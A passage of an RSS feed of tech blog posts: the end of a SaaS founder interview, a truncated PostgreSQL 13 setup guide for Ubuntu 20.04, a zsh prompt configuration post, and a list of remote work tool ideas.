time?</span></p><p><b>Emeric:</b></p><p><span>Nothing. I was not taking home anything. You can‚Äôt take home anything when you‚Äôre making so little money? My co-founder was getting a little because he was single and he had to. My wife was making some money and I had unemployment allowance for a while and I did other jobs on the side. So I always struggled for a long time.</span></p><p><span>It was years and years of being minimum wage, unemployment, side gigs. I did run companies for clients as a manager for several years where I was basically running their company from Monday through Thursday and doing mine on Friday, Saturday and Sunday.&nbsp;</span></p><p><span>So that‚Äôs kind of that kind of like until we got somewhere, we have </span><a href="https://www.agorapulse.com/"><span>Agorapulse</span></a><span> which broke even in 2015. And finally I was free.</span></p><p><b>Hammad:</b></p><p><span>Let‚Äôs talk about how you transitioned from your previous Saas company to this one. What was the product development strategy? How long did that take and how long before you actually achieve product market fit?</span></p><p><b>Emeric:</b></p><p><span>Well, you know, you have to realize that when you‚Äôre bootstrapped your product is always very limited, somewhat not great for a long time. so what the product looked like in the very early days, it was a Facebook contest and promotion. That‚Äôs what it was. And then, you know, we added a couple of components to reply to fake comments on the wall.</span></p><p><span>So basically it was only Facebook. It was mostly contest and promotion, because that was a big thing at the time. And we started making some money with that and we had some level of growth when we had some level of product market fit with that alone.</span></p><p><span>But then we realized that the customer churn was very high. Okay. What do we do? So the churn should not be too high because that was a point solution. Funny, you mentioned that in the conversation earlier we had. This book contest and promotion was not a system of record. It was a point solution and that‚Äôs not good.</span></p><p><span>So we said, how do we do, how do we become a system of record? We have to be the b2b Saas software that a job in the company is using on a daily basis, or at least on a weekly basis. What is this? It‚Äôs a social media management tool. It‚Äôs a tool where they go every day to reply to posts who do all that stuff.</span></p><p><span>Let‚Äôs do that. Who does that? Whose tweet was doing that at the time? </span><a href="https://sproutsocial.com/"><span>SproutSocial</span></a><span> was not even doing that because they were on Twitter only in 2012. Well it started as a Twitter only and then expanded to the other stuff. And we said, okay, we need to do that. So if we need to do that and stick to people, can they do that only on Facebook?</span></p><p><span>No, they‚Äôre not interested. We need to have at least Twitter. That was 2012. Again Instagram was not a thing, LinkedIn barely. And so we started to add Twitter to the mix and then it was okay, now we have Facebook, Twitter, what do you want? And then, they also want this and they also want that. And so in the early days when you bootstrapped, let‚Äôs say you‚Äôre 15% of where you should be to be a good decent legitimate player in the field of social media management tools, which is a system of record for social media managers or community managers and then because you‚Äôre bootstrapped your dev team is very very small. The dev team has been three people for a long time with three people between 2012 and 2013 for the beginning of 2014. So you move slowly because you have very little resources and your product is not perfect.&nbsp;</span></p><p><span>So I would tell you we had product market fit for a full blown social media management tool, it probably was the end of 2016. That means that before that growth is slow it‚Äôs there, but it‚Äôs slow and you lose a lot of business to big players who have raised money and stuff like that.</span></p><p><span>So you have to be ready to be very patient.&nbsp;</span></p><p><b>Hammad:</b></p><p><span>Emeric, a couple of questions. I mean, first of all, it‚Äôs amazing, you stuck with it for five years until you actually brought real traction, but it takes a lot of patience and you just have to stick with it. So from 2011 until 2012, you figured out that what you have in the Facebook contest is not going to be the sustainable business. My question is if it was customer feedback or you just figured out that, look, this is not gonna work.</span></p><p><b>Emeric:</b></p><p><span>We looked at the churn rate. We saw the churn number and we said, there‚Äôs no way this is a sustainable business 20% mrr churn every month. Ask ‚Ä¶</span></p></div></div></div></div></div></div></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://keevi.io/from-bootstrapped-to-14m-in-10-years-with-emeric-ernoult-of-agorapulse">https://keevi.io/from-bootstrapped-to-14m-in-10-years-with-emeric-ernoult-of-agorapulse</a></em></p>]]>
            </description>
            <link>https://keevi.io/from-bootstrapped-to-14m-in-10-years-with-emeric-ernoult-of-agorapulse</link>
            <guid isPermaLink="false">hacker-news-small-sites-24928083</guid>
            <pubDate>Thu, 29 Oct 2020 07:23:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting Started With Postgres 13 on Ubuntu 20.04]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24928008">thread link</a>) | @i_have_to_speak
<br/>
October 29, 2020 | https://pgdash.io/blog/postgres-13-getting-started.html?h | <a href="https://web.archive.org/web/*/https://pgdash.io/blog/postgres-13-getting-started.html?h">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div>
          
          <p>Setup and start using the latest PostgreSQL version
</p>
        </div>
      </div><div>
        <div>
          <div>
            <p>PostgreSQL 13, the latest release of the Postgres database software, comes with many 
<a href="https://www.postgresql.org/docs/13/release-13.html">under-the-hood improvements</a>.
While being the most popular and versatile open-source RDBMS around, it is not
the easiest to setup and get started. Read on to learn how you can get going
with the latest version of Postgres on the latest LTS version of the Ubuntu
server.</p>

<h3 id="installation">Installation</h3>

<p>Ubuntu 20.04 comes with Postgres 12 from it‚Äôs <em>universe</em> repository. Since we
want version 13, we can directly use the PostgreSQL project‚Äôs official
<a href="https://wiki.postgresql.org/wiki/Apt">APT repository</a>.
This repository contains binaries for Ubuntu 20.04, and also includes packages
for various extensions that you might want to install later.</p>

<p>Let‚Äôs setup the repository like this (note that ‚Äúfocal‚Äù is the code name for
Ubuntu 20.04):</p>

<figure><pre><code data-lang="shell"><span># add the repository</span>
<span>sudo tee</span> /etc/apt/sources.list.d/pgdg.list <span>&lt;&lt;</span><span>END</span><span>
deb http://apt.postgresql.org/pub/repos/apt/ focal-pgdg main
</span><span>END

</span><span># get the signing key and import it</span>
wget https://www.postgresql.org/media/keys/ACCC4CF8.asc
<span>sudo </span>apt-key add ACCC4CF8.asc

<span># fetch the metadata from the new repo</span>
<span>sudo </span>apt-get update</code></pre></figure>

<p>We can now install the PostgreSQL server and other command-line tools using:</p>

<figure><pre><code data-lang="shell"><span>sudo </span>apt-get <span>install</span> <span>-y</span> postgresql-13</code></pre></figure>

<p>The installation does a few things:</p>

<ul>
  <li>It installs the PostgreSQL server, utilities and a command-line client called
<strong>psql</strong>.</li>
  <li>It creates a Linux system user called <strong>postgres</strong>.  All data files are owned
by this user, and all processes run as this user.</li>
  <li>It creates a <em>database cluster</em> (see below). In this cluster, it creates a
database, also called <strong>postgres</strong>.</li>
  <li>It creates one PostgreSQL user (<em>not</em> the Linux system user), also called
<strong>postgres</strong>. This PostgreSQL user has superuser privileges.</li>
</ul>

<p>You can see this is beginning to get confusing!</p>

<h3 id="database-clusters">Database Clusters</h3>

<p>In Postgres terms, we now have a single database cluster up and running. A
single database cluster can contain one or more databases. In the database
cluster that we now have, there is a database called ‚Äúpostgres‚Äù. (There are
also a couple of ‚Äútemplate‚Äù databases that we can ignore for now.)</p>

<p>A database cluster is managed by a main postgres process called the <em>postmaster</em>.
It spawns various child processes that either perform various system tasks or
handle incoming client connections. Have a look at the currently running
processes:</p>

<figure><pre><code data-lang="text">alice@ubu:~$ ps -o uname,pid,ppid,cmd -H -U postgres
USER         PID    PPID CMD
postgres    4880       1 /usr/lib/postgresql/13/bin/postgres -D /var/lib/postgresql/13/main -c config_file=/etc/postgresql/13/main/postgresql.conf
postgres    4882    4880   postgres: 13/main: checkpointer
postgres    4883    4880   postgres: 13/main: background writer
postgres    4884    4880   postgres: 13/main: walwriter
postgres    4885    4880   postgres: 13/main: autovacuum launcher
postgres    4886    4880   postgres: 13/main: stats collector
postgres    4887    4880   postgres: 13/main: logical replication launcher</code></pre></figure>

<p>Here the postmaster process is 4880 and it has spawned 6 child processes that
handle various housekeeping activities. You can also see the location of the
cluster (<code>/var/lib/postgresql/13/main</code>) and the location of the configuration
file (<code>/etc/postgresql/13/main/postgresql.conf</code>).</p>

<h3 id="reloading-and-restarting">Reloading and Restarting</h3>

<p>At various times, you may need to <em>reload</em> or <em>restart</em> your Postgres server.
Reloading causes Postgres to re-examine it‚Äôs configuration files and apply the
changes. If there are no changes to the configuration files, nothing bad happens.
Reloading does not disturb the currently connected clients. To reload your
Postgres server, you can do:</p>

<figure><pre><code data-lang="shell"><span>sudo </span>systemctl reload postgresql</code></pre></figure>

<p>Some configuration changes will take effect only after you restart the server.
This is more disruptive and will disconnect all connected clients. To restart,
you can:</p>

<figure><pre><code data-lang="shell"><span>sudo </span>systemctl restart postgresql</code></pre></figure>

<h3 id="log-files">Log Files</h3>

<p>As you can see, there is a systemd service called <code>postgresql</code> that you can
use to control the postmaster. If the service does not start, you can check
it‚Äôs status to check for error messages:</p>

<figure><pre><code data-lang="shell">alice@ubu:~<span>$ </span><span>sudo </span>systemctl status postgresql
‚óè postgresql.service - PostgreSQL RDBMS
     Loaded: loaded <span>(</span>/lib/systemd/system/postgresql.service<span>;</span> enabled<span>;</span> vendor preset: enabled<span>)</span>
     Active: active <span>(</span>exited<span>)</span> since Thu 2020-10-29 04:52:29 UTC<span>;</span> 25min ago
   Main PID: 4557 <span>(</span><span>code</span><span>=</span>exited, <span>status</span><span>=</span>0/SUCCESS<span>)</span>
      Tasks: 0 <span>(</span>limit: 1075<span>)</span>
     Memory: 0B
     CGroup: /system.slice/postgresql.service

Oct 29 04:52:29 ubu systemd[1]: Starting PostgreSQL RDBMS...
Oct 29 04:52:29 ubu systemd[1]: Finished PostgreSQL RDBMS.</code></pre></figure>

<p>The PostgreSQL server writes a log file, which you can check for more detailed
error messages. This file is located at <code>/var/log/postgresql/postgresql-13-main.log</code>:</p>

<figure><pre><code data-lang="shell">alice@ubu:~<span>$ </span><span>cat</span> /var/log/postgresql/postgresql-13-main.log
2020-10-29 04:52:34.096 UTC <span>[</span>4880] LOG:  starting PostgreSQL 13.0 <span>(</span>Ubuntu 13.0-1.pgdg20.04+1<span>)</span> on x86_64-pc-linux-gnu, compiled by gcc <span>(</span>Ubuntu 9.3.0-10ubuntu2<span>)</span> 9.3.0, 64-bit
2020-10-29 04:52:34.097 UTC <span>[</span>4880] LOG:  listening on IPv4 address <span>"127.0.0.1"</span>, port 5432
2020-10-29 04:52:34.099 UTC <span>[</span>4880] LOG:  listening on Unix socket <span>"/var/run/postgresql/.s.PGSQL.5432"</span>
2020-10-29 04:52:34.106 UTC <span>[</span>4881] LOG:  database system was shut down at 2020-10-29 04:52:31 UTC
2020-10-29 04:52:34.112 UTC <span>[</span>4880] LOG:  database system is ready to accept connections</code></pre></figure>

<h3 id="connecting-to-your-postgres-server">Connecting to Your Postgres Server</h3>

<p>Now that we have our server up and running, let‚Äôs try to connect to it. By default,
the server listens only for:</p>

<ul>
  <li>TCP connections from 127.0.0.1 on port 5432, and</li>
  <li>Unix domain sockets in /var/run/postgresql</li>
</ul>

<p>Because of the default configuration, the only way to connect to the server
right now is via the Unix socket from a process that is running as the
system user <em>postgres</em>. Let‚Äôs run the standard interactive client <em>psql</em> like
this:</p>

<figure><pre><code data-lang="shell">alice@ubu:~<span>$ </span><span>sudo</span> <span>-u</span> postgres psql postgres
psql <span>(</span>13.0 <span>(</span>Ubuntu 13.0-1.pgdg20.04+1<span>))</span>
Type <span>"help"</span> <span>for </span>help.

<span>postgres</span><span>=</span><span>#</span></code></pre></figure>

<p>Here we‚Äôre running psql as the system user postgres (‚Äúsudo -u postgres psql‚Äù)
and connecting to the database called ‚Äúpostgres‚Äù (the last ‚Äúpostgres‚Äù on the
command-line.) The ‚Äúpostgres=#‚Äù prompt indicates the name of the currently
connected database (‚Äúpostgres‚Äù) and that we have superuser privileges (‚Äú#‚Äù as opposed to
‚Äú$‚Äù).</p>

<p>The connection happened via Unix sockets (this is the default method in psql).
Since by default the postgres user does not have a password and the default
configuration requires password authentication for TCP connections, it is not
possible to connect over 127.0.0.1:5432 right now.</p>

<h3 id="allowing-incoming-connections-from-an-internal-network">Allowing Incoming Connections From an Internal Network</h3>

<p>First let‚Äôs change the configuration to allow connections from an internal
network. Assuming our server‚Äôs IP on this network is 10.1.2.3, we can edit
the main configuration file at <code>/etc/postgresql/13/main/postgresql.conf</code> and
change the lines:</p>

<figure><pre><code data-lang="text">#listen_addresses = 'localhost'         # what IP address(es) to listen on;
                                        # comma-separated list of addresses;
                                        # defaults to 'localhost'; use '*' for all</code></pre></figure>

<p>to:</p>

<figure><pre><code data-lang="text">listen_addresses = 'localhost,10.1.2.3'</code></pre></figure>

<p>We also need to tell Postgres to use password authentication for connections
coming in from these networks. For this, edit another configuration file
called <code>/etc/postgresql/13/main/pg_hba.conf</code> and change the line:</p>

<figure><pre><code data-lang="text">host    all             all             127.0.0.1/32            md5</code></pre></figure>

<p>to:</p>

<figure><pre><code data-lang="text">host    all             all             127.0.0.1/32            scram-sha-256
host    all             all             10.1.0.0/16             scram-sha-256</code></pre></figure>

<p>(Assuming the internal network is 10.1.0.0/16.)</p>

<p>We‚Äôve also changed the default <code>md5</code> method to the newer and more secure
<code>scram-sha-256</code>. All other occurances of <code>md5</code> in the file should also be
replaced with <code>scram-sha-256</code>. If your application or database driver does not
support this method, continue to use the <code>md5</code> method instead.</p>

<p>For these changes to take effect, you need to restart the server:</p>

<figure><pre><code data-lang="shell"><span>sudo </span>systemctl restart postgresql</code></pre></figure>

<h3 id="creating-a-regular-user-and-database">Creating a Regular User and Database</h3>

<p>We‚Äôre almost there!</p>

<p>We can now create a regular user that our application can connect as, and a
database over which it has full control. Connect as the superuser <em>postgres</em>
locally from the server machine to do this:</p>

<figure><pre><code data-lang="shell">alice@ubu:~<span>$ </span><span>sudo</span> <span>-u</span> postgres psql postgres
psql <span>(</span>13.0 <span>(</span>Ubuntu 13.0-1.pgdg20.04+1<span>))</span>
Type <span>"help"</span> <span>for </span>help.

<span>postgres</span><span>=</span><span># SET password_encryption = 'scram-sha-256';</span>
SET
<span>postgres</span><span>=</span><span># CREATE USER alice PASSWORD 's3cr3tp@ss';</span>
CREATE ROLE
<span>postgres</span><span>=</span><span>#</span></code></pre></figure>

<p>(Omit the first command if you want to use <code>md5</code> instead.) This created a user
called <em>alice</em> with the password <em>s3cr3tp@ss</em>. Let‚Äôs also create a database
which this user will own:</p>

<figure><pre><code data-lang="shell"><span>postgres</span><span>=</span><span># CREATE DATABASE app1 OWNER alice;</span>
CREATE DATABASE
<span>postgres</span><span>=</span><span>#</span></code></pre></figure>

<p>The database is called <em>app1</em>. Since <em>alice</em> owns this database, all operations
within the database (like creating tables, inserting rows) are allowed if the
application connects as the user <em>alice</em>.</p>

<p>Let‚Äôs try connecting as <em>alice</em>, over the network:</p>

<figure><pre><code data-lang="shell">~<span>$ </span>psql <span>-h</span> 10.1.2.3 <span>-U</span> alice app1
Password <span>for </span>user alice:
psql <span>(</span>13.0 <span>(</span>Ubuntu 13.0-1.pgdg20.04+1<span>))</span>
SSL connection <span>(</span>protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off<span>)</span>
Type <span>"help"</span> <span>for </span>help.

<span>app1</span><span>=&gt;</span></code></pre></figure>

<p>Cool! We‚Äôre now connected to the database <em>app1</em> as the user <em>alice</em>.</p>

<h3 id="deleting-databases-backing-up-and-restoring">Deleting Databases, Backing up and Restoring</h3>

<p>Here are a few tricks that can help as you continue working with your Postgres
server:</p>

<h4 id="deleting-a-database">Deleting a database</h4>

<p>You can delete the database you just created (‚Äúapp1‚Äù), like this:</p>

<figure><pre><code data-lang="shell">alice@ubu:~<span>$ </span>psql <span>-h</span> 127.0.0.1 <span>-U</span> alice app1
Password <span>for </span>user alice:
psql <span>(</span>13.0 <span>(</span>Ubuntu 13.0-1.pgdg20.04+1<span>))</span>
SSL connection <span>(</span>protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off<span>)</span>
Type <span>"help"</span> <span>for </span>help.

<span>app1</span><span>=&gt;</span> <span>\c</span> postgres
SSL connection <span>(</span>protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off<span>)</span>
You are now connected to database <span>"postgres"</span> as user <span>"alice"</span><span>.</span>
<span>postgres</span><span>=&gt;</span> DROP ‚Ä¶</code></pre></figure></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pgdash.io/blog/postgres-13-getting-started.html?h">https://pgdash.io/blog/postgres-13-getting-started.html?h</a></em></p>]]>
            </description>
            <link>https://pgdash.io/blog/postgres-13-getting-started.html?h</link>
            <guid isPermaLink="false">hacker-news-small-sites-24928008</guid>
            <pubDate>Thu, 29 Oct 2020 07:03:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Useful Shell Prompt]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24927968">thread link</a>) | @quyleanh
<br/>
October 28, 2020 | https://solovyov.net/blog/2020/useful-shell-prompt/ | <a href="https://web.archive.org/web/*/https://solovyov.net/blog/2020/useful-shell-prompt/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><p>There are only a few apps I use every day and shell ‚Äî ZSH ‚Äî is one of the most used. It‚Äôs been that way since the beginning of the ‚Äô00s and back then I spent a lot of time configuring my prompt to be a good balance between compact/readable and useful. I found that I dislike fancy two-line prompts, information on a right-hand side (because of its awkward behavior), and stuff like that. So the result looks like that:</p>
<pre><code>piranha@rigel ~&gt; ‚ñà
</code></pre>
<p>where <code>‚ñà</code> is a cursor. It shows username, <code>@</code> to separate it from hostname - or <span><code>#</code></span> if this is uid 0 shell, then hostname, and a home-abbreviated path. One of the fancy things is that space before the cursor is Unicode glyph <code>\u00A0</code> - non-breaking space - which is bound in ZLE to delete everything to the beginning of a line. Unfortunately, this does not work with Terminal.app, so it just sits there waiting for a better time. This setup along with colors had no changes for over a decade.</p>
<p>But a week ago a saw a <a href="https://twitter.com/thingskatedid/status/1316081732467081217">tweet</a> with an idea to change prompt‚Äôs prompt (the <code>&gt;</code> thingie) to a red color when previous command exited with an error status. This motivated me to cleanup and update my prompt to a newer conventions. This is a result:</p>
<p><img alt="prompt screenshot" src="https://solovyov.net/media/prompt.jpg" height="60px" width="127px"></p>
<p>You can see I removed my username since it really gives me no information, no reason to spend space on that. I also really like white background, but if you don‚Äôt, changing colors is easy ‚Äî I‚Äôll explain how everything works.</p>
<p>Let‚Äôs break down it bit by bit. The prompt syntax is a little hard on the eyes - in case if you have ideas on how to write this so next time I won‚Äôt have to dig deep into ZSH documentation, I‚Äôll be glad to listen.</p>
<pre><code>p_at='%(!.%F{red}%B#%b%f.@)'
</code></pre>
<p>In this case, few things are interesting:</p>
<ul>
<li><code>%(x.if-true.if-false)</code> construct (documented <a href="http://zsh.sourceforge.net/Doc/Release/Prompt-Expansion.html#Conditional-Substrings-in-Prompts">here</a>) shows either <code>@</code> if I‚Äôm a normal user or a red <span><code>#</code></span> if I‚Äôm a root.</li>
<li><code>!</code> there means ‚ÄúTrue if the shell is running with privileges‚Äù.</li>
<li>You can clearly see <code>@</code> after the second dot, but what does <code>%F{red}%B#%b%f</code> mean? <code>%B</code> means ‚Äústart bold‚Äù, <code>%b</code> means ‚Äúend bold‚Äù.</li>
<li><code>%F</code>/<code>%f</code> duo is ‚Äústart/stop color‚Äù - it can either accept old-style color numbers (where 1 is red) or color names, which is easier to understand.</li>
</ul>
<pre><code>p_host='%F{blue}%m%f'
p_path='%F{blue}%~%f'
</code></pre>
<p>Those are easy to understand, just refer to <a href="http://zsh.sourceforge.net/Doc/Release/Prompt-Expansion.html">documentation</a> ‚Äî <code>%m</code> is a hostname before the first dot, <code>%~</code> is a path where <code>$HOME</code> is abbreviated to <code>~</code>.</p>
<pre><code>p_pr='%(?.%F{blue}.%F{red})&gt;%f'
</code></pre>
<p>This is a new part. <code>?</code> means ‚ÄúTrue if exit status of the last command was 0‚Äù. So if a command exited nicely (with a status code 0), then it‚Äôs going to be blue <span><code>&gt;</code></span>, in other case it‚Äôs going to be red <span><code>&gt;</code></span>. Voila! :-)</p>
<p>End result looks like this:</p>
<pre><code>p_at='%(!.%F{red}%B#%b%f.@)'
p_host='%F{blue}%m%f'
p_path='%F{blue}%~%f'
p_pr='%(?.%F{blue}.%F{red})&gt;%f'

PS1="$p_at$p_host $p_path$p_pr "
unset p_at p_host p_path p_pr
</code></pre>
<p>You can see I‚Äôm unsetting color in every variable and unset those variables ‚Äî cleaning up after yourself is a valuable habit, especially with a shell. :-)</p>
<p>I‚Äôm pretty sure the same could be done for bash (or tclsh, or whatever), but I‚Äôm not using it so‚Ä¶ If anybody wants to contribute a similar configuration for other shells, I‚Äôll gladly link to a post or add it here.</p>
</div></div>]]>
            </description>
            <link>https://solovyov.net/blog/2020/useful-shell-prompt/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24927968</guid>
            <pubDate>Thu, 29 Oct 2020 06:51:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The remote work tools we'd love to see next year]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24927955">thread link</a>) | @dmonn
<br/>
October 28, 2020 | https://nohq.co/blog/the-remote-work-tools-wed-love-to-see-in-2021/ | <a href="https://web.archive.org/web/*/https://nohq.co/blog/the-remote-work-tools-wed-love-to-see-in-2021/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <p>In 2020, we were happy to have talked to <strong>94</strong> (!) remote tool companies about what they are up to. With more than a dozen we talked a little closer and many of them we've shown you. However, amongst the sea of amazing new innovations in the remote work space, we still found gaps.</p>
<p>Struggles we've heard from remote teams that don't have a solution yet. Solutions that are missing that little something to make them amazing. These are our wishes for the next year.</p>

<h2>Operations</h2>
<p>Running an internationally distributed team has a lot of challenges to overcome, but the most rigid of them all are international regulations and specializations when it comes to running a multi-national organization.</p>
<p>The operations side of remote work is usually deemed pretty unsexy. It's all about working with regulators, shaking hands and most likely an expensive journey to expand in a lot of countries. Hard work, but one that wouldn't go unappreciated.</p>

<h3>1. Better payment gateways for remote teams</h3>
<p>For how far we've come with remote work, we really haven't made a ton of strides with cross-continental payments. In my first-ever remote job, I used to get paid from a regular US corporate bank account directly to my swiss bank account. Payments got routed wrongly here and there, the fees were sky-high and the payments often took a week to get to me.</p>
<p>Since then, we've made a stride or two. With something like <a href="https://bit.ly/3kzvDyo">TransferWise,</a> you can make the whole process a little bit speedier and cheaper. Transfers now only take 1-2 working days and are fairly transparent. Even better: Fees and availability aren't confined to one nation, TransferWise is almost available anywhere.</p>
<p>Then, there are online wallets like Venmo and PayPal. They are really handy to guarantee instant transfers at a cheap price and are very handy for folks that are unbanked. Skipping the dusty banking infrastructure? All for it!</p>
<p>And then, of course, there's cryptocurrency. Now, Bitcoin &amp; co. were never meant to become investment instruments. In the past year, I asked to get paid for something through crypto twice. The payments were instant, extremely cheap (<em>I paid around $0.001 in fees</em>) and my bank didn't ask me about that weird big-money-transfer from the US. Now, if it only was easier to access.</p>

<p><img src="https://nohq.co/media/undraw_online_payments_luau.png" alt="" width="600" height="370"></p>

<p>So, how does the payment gateway of the future look like? Well, first of all, it should be accessible. Too many financial services are confined to the US, Canada and the UK. It should also be internationally receivable. While a bank transfer almost goes anywhere, I've heard multiple times now that people would prefer not getting foreign direct-to-bank payments to accounts in India, for example. The remote payment stack accounts for that.</p>
<p>Finally, waiting for your pay stub and then the money a couple of days later really doesn't fit in the internet age anymore. <strong>Maybe you can leverage cryptocurrency and existing infrastructure to create something instant, simple and internationally accessible?</strong></p>

<h3>2. Making 401k international</h3>
<p>When it comes to retirement benefits, many remote companies don't take it 100% seriously just yet and according to the latest surveys, employees don't mind either. With work-life balance as a commonly cited benefit, being remote in itself is an amazing perk. People are happy to take a pay cut or even let go of their retirement benefits.</p>
<p>Even if a company is <a href="https://about.gitlab.com/handbook/total-rewards/benefits/general-and-entity-benefits/#general-and-entity-benefits">open to having a 401k</a>, doing it the "right" away is almost impossible with every country having its own system. From the <a href="https://de.wikipedia.org/wiki/Pensionskasse">Pensionskasse</a> in Germany to the <a href="https://en.wikipedia.org/wiki/Pensions_in_Japan">EPS</a> in Japan, countries run their own systems that are usually not accessible to foreign entities.</p>
<p>This might not seem important at first, but according to <a href="http://www.mit.edu/~vchern/papers/ch_401k.pdf">researchers at MIT</a> and multiple financial advisories, taking part in and maxing out 401k accounts (and subsequent alternatives in other countries) is a cornerstone to building life-changing wealth. For all personal finance lovers out there, not having that option may be a dealbreaker. Offering 401k and other retirement benefits is about to get a lot more important.</p>
<p>Our idea: <strong>What can a private company build within the regulations that allows for true, employer-matched and internationally available retirement accounts?</strong> Piggy-back off existing infrastructure and regulations? Sell gold bars and store them in a few storage units? Some sort of e-insurance? Again, cryptocurrency? We'd love to hear ideas.</p>

<h3>3. Benefits that are not only show</h3>
<p>For most remote companies, "perks" and "benefits" under the hood only mean a bit more money. In all remote jobs I've had so far, I've claimed my perk payouts as part of my regular salary payout. That means additional taxable income, not what perks are about.</p>
<p>Let me explain. A few years ago, my friend got hired at a very generous company local to us. He got a generous salary but was additionally able to lease a car through the company, set up a subscription for lunch delivery and for a while was even able to rent a room out of the company's real estate arm. The costs of that were deducted directly from his salary. As a result of that, he paid a few $1,000 less in taxes than in the previous years.</p>
<p>Many of those perks ‚Äì from a company car to new Macbook ‚Äì are much easier to reimburse in cash for remote companies, so no pre-tax perks at all. <strong>As a potential new service, what can you do to make this happen?</strong></p>
<p>One option is to hire through one of the many <a href="https://nohq.co/hire/">EOR services</a> that specialize in providing a full-service. For many companies that already have their payroll in order, that's not interesting though. You could save people multiple $1,000s in taxes here, so it's a service you don't have to sell for cheap.</p>

<h2>Communication</h2>
<p>Communication is still the king of all remote tools. Out of the many tools we've seen this year, probably 2/3 were in the communication and collaboration space of some sort. So, what gaps are supposed to still be there? Let's walk through it.</p>

<h3>4. All-hands meetings that work</h3>
<p>I believe meetings are largely figured out. This year, we've seen some iterations on the traditional meeting experience, but most of them are a minor improvement for teams that have an amazing product-fit. One thing that isn't solved yet is large, moderated all-hands meetings.</p>
<p>All-hands meetings are meetings that include all, or at least most of the company in the same meeting. The meeting experience is fundamentally different from your standard small group meeting: The speaker is in focus and other participants rarely speak.</p>
<p>The relationship between speaker and listener is quite clear ‚Äì one speaker, many participants (often over 100) that should be able to speak when called to do so but not otherwise. The experience of such meetings has improved with new meeting software, compared to teams that had to make-do with Skype &amp; co., but it's still not seamless.</p>

<p><em>"At some point, to have everyone on a Skype call for an all-hands meeting, we would have two laptops set up next to each other and have one laptop call half the company and the other laptop call the other half of the company. That was nonsense √∞≈∏Àú‚Äû"</em></p>
<p><strong><a href="https://nohq.co/blog/michael-fey-of-1password/">Michael Frey, VP Engineering at 1Password</a></strong></p>

<p>The last time I had an all-hands meeting on Zoom, things didn't go great. Some people called in and were unable to mute themselves. People tried to ask questions but got interrupted by either the speaker or another person in the audience.</p>
<p>With over 100 participants, latency was all over the place and the worst part ‚Äì the meeting host had a disconnect at some point in the meeting and while the room was able to continue, the recording stopped there. A third of the team was not able to re-play the meeting.</p>
<p>I believe all-hands meetings warrant a new piece of tech that is rarely used ‚Äì probably only for larger talks and announcements once a month ‚Äì but works for that type of meeting every single time, including server-side recording, low latency, speaking requests and a larger range of moderation features.</p>

<h3>5. Communication &amp; Writing Training</h3>
<p>Communication and writing skills have been essential requirements for modern remote teams that largely rely on sparse and long-form communication. Many talented people struggle with that, are either not used or accommodated to typing a lot of simply prefer the face-to-face way of doing things.</p>
<p>Just like we build our knowledge worker's skills using education stipends, conferences, courses and books, we should also start looking into active communication training.</p>
<p>In the past, I have benefitted from coaching a lot in my career. Coaches have helped me push through some tough professional issues and have helped me build a small successful business. In the future, coaching will not only be interesting for hard skills but possibly even more soft skills. Getting continuous training in communication and writing will be popular with goal-getters and teams alike.</p>
<p>Now, I'm not necessarily advocating for plain and simple writing training. <a href="https://www.grammarly.com/">Grammarly</a> has put an automated writing coach in many author's pockets, but what if you could push that further? Remind you that you didn't give a status update in a while? Notifying you if your text lacks some context or reads passive-aggressive. Grammarly works great, even as I am writing this post, but it's not an end-to-end communication coach, just an integral part of it. <strong>We'd love to see something new in that space.</strong></p>

<h3>6. Asynchronous Brainstorm</h3>
<p>A consistent piece of feedback we've gotten this year is that teams struggle to find a good way to brainstorm new innovations. Remote work is amazing to get into a deep state, collect some thoughts and find new ideas, but when it comes to collaboration and getting those thoughts out, it gets more difficult.</p>
<p>The way we've learned to brainstorm in the professional world is using visualizations. We like to draw mind maps or sketch graphs on a whiteboard. Filling out the blank space can indeed yield new ideas and has helped really innovative teams come up with amazing ideas.</p>

<p><img src="https://nohq.co/media/undraw_miro_qvwm.png" alt="" width="600" height="407"></p>

<p>The options we have to do so across the globe are not always fitting to ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nohq.co/blog/the-remote-work-tools-wed-love-to-see-in-2021/">https://nohq.co/blog/the-remote-work-tools-wed-love-to-see-in-2021/</a></em></p>]]>
            </description>
            <link>https://nohq.co/blog/the-remote-work-tools-wed-love-to-see-in-2021/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24927955</guid>
            <pubDate>Thu, 29 Oct 2020 06:48:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Good Things Don't Scale]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24927952">thread link</a>) | @r4um
<br/>
October 28, 2020 | http://blog.vickiboykis.com/2017/05/10/good-things-don%27t-scale/ | <a href="https://web.archive.org/web/*/http://blog.vickiboykis.com/2017/05/10/good-things-don%27t-scale/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      


<article>
  
  <p><time datetime="2017-05-10T00:00:00-04:00">05/10/17</time>
    <span></span>
  </p>
  <hr>
  <p><img src="https://raw.githubusercontent.com/vkblog/vkblog.github.io/master/public/img/viking.jpeg" alt="viking"></p>

<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
